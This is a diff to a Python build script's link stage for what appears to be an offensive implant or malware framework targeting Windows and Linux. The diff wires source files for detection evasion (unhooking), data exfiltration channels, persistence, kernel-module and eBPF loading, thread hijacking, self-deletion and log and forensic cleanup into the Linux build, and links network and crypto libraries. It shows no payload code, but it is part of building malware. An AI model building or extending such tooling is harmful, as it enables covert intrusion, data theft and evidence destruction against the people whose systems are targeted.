@@ -60,7 +60,9 @@ class LinkStage(Stage):
 
             link_cmd = [
                 str(tc.clang()), "--target=x86_64-pc-linux-gnu", str(obj_path)
-            ] + runtime_objs + ["-o", str(output)]
+            ] + runtime_objs + [
+                "-lcurl", "-lcrypto", "-lz", "-o", str(output)
+            ]
             run_cmd(link_cmd, "Linking Linux ELF executable")
 
         ctx.state["executable"] = output
@@ -96,6 +98,7 @@ class LinkStage(Stage):
                 runtime_dir / "util"         / "mem.c",
                 runtime_dir / "windows"      / "windows_utils.c",
                 runtime_dir / "windows"      / "windows_api_impl.c",
+                runtime_dir / "windows"      / "network" / "http.c",
                 runtime_dir / "windows"      / "registry" / "registry.c",
                 runtime_dir / "evasion"      / "unhook.c",
                 runtime_dir / "evasion"      / "syscalls.c",
@@ -108,6 +111,7 @@ class LinkStage(Stage):
                 runtime_dir / "exfil"        / "exfil.c",
                 runtime_dir / "cleanup"      / "forensics.c",
                 runtime_dir / "forensics"    / "forensic_api_impl.c",
+                runtime_dir / "compression"  / "compression.c",
             ]
             windows_sources = [s for s in potential_sources if s.exists()]
 
@@ -115,7 +119,36 @@ class LinkStage(Stage):
         linux_sources = []
         if target_os == "linux":
             linux_potential = [
-                runtime_dir / "forensics"    / "forensic_api_impl.c",
+                runtime_dir / "util"                    / "mem.c",
+                runtime_dir / "compression"             / "compression.c",
+                runtime_dir / "common"                  / "encoding.c",
+                runtime_dir / "forensics"               / "forensic_api_impl.c",
+                runtime_dir / "linux"                   / "syscalls" / "syscall.c",
+                runtime_dir / "linux"                   / "syscalls" / "sysinfo_syscall.c",
+                runtime_dir / "linux"                   / "syscalls" / "env_syscall.c",
+                runtime_dir / "linux"                   / "syscalls" / "file_syscall.c",
+                runtime_dir / "linux"                   / "syscalls" / "dir_syscall.c",
+                runtime_dir / "linux"                   / "core" / "runtime_init.c",
+                runtime_dir / "linux"                   / "core" / "sandbox_ops.c",
+                runtime_dir / "linux"                   / "core" / "audit_ops.c",
+                runtime_dir / "linux"                   / "kernel" / "lkm_loader.c",
+                runtime_dir / "linux"                   / "kernel" / "ebpf_loader.c",
+                runtime_dir / "linux"                   / "kernel" / "module_ops.c",
+                runtime_dir / "linux"                   / "kernel" / "modules.c",
+                runtime_dir / "linux"                   / "kernel" / "module_loader.c",
+                runtime_dir / "linux"                   / "persistence.c",
+                runtime_dir / "linux"                   / "exfil" / "exfil_channels.c",
+                runtime_dir / "linux"                   / "io" / "io_core.c",
+                runtime_dir / "linux"                   / "threading" / "threadpool.c",
+                runtime_dir / "linux"                   / "networking" / "network.c",
+                runtime_dir / "linux"                   / "forensics" / "linux_forensics.c",
+                runtime_dir / "linux"                   / "forensics" / "cleanup.c",
+                runtime_dir / "linux"                   / "process" / "ptrace_control.c",
+                runtime_dir / "linux"                   / "process" / "thread_hijack.c",
+                runtime_dir / "windows"                 / "network" / "http.c",
+                runtime_dir / "evasion"                 / "unhook.c",
+                runtime_dir / "cleanup"                 / "self_delete.c",
+                runtime_dir / "cleanup"                 / "logs.c",
             ]
             linux_sources = [s for s in linux_potential if s.exists()]
 
@@ -154,9 +187,6 @@ void jocky_byovd_unload(void* ctx) { (void)ctx; }
         else:  # Linux
             compat_funcs = """#include <stddef.h>
 long ptrace(int req, int pid, void* addr, void* data) { (void)req; (void)pid; (void)addr; (void)data; return 0; }
-int fs_exists(const char* p) { (void)p; return 0; }
-int jocky_lkm_unload(int h) { (void)h; return 0; }
-int jocky_module_unload(void* h) { (void)h; return 0; }
 """
         compat_c.write_text(compat_funcs)
         target_flag = "--target=x86_64-pc-windows-gnu" if target_os == "windows" else "--target=x86_64-pc-linux-gnu"
